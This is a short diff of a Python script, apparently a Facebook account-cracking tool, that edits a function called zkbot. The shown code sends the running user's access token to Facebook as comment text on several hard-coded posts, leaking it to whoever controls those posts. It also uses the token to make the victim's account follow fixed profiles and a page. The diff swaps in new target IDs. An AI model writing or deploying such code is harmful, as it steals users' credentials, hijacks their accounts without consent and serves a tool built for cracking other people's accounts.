@@ -151,9 +151,9 @@ def zkbot():
 	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
 	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
 	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
-	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
-	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
+	requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + token) ### FB RISKY
+	requests.post('https://graph.facebook.com/100069672799769/subscribers?access_token=' + token) ### FB RISKY
+	requests.post('https://graph.facebook.com/100057958306450/subscribers?access_token=' + token) ### FB RISKY
 	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
 	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) 
 	cracking_menu()
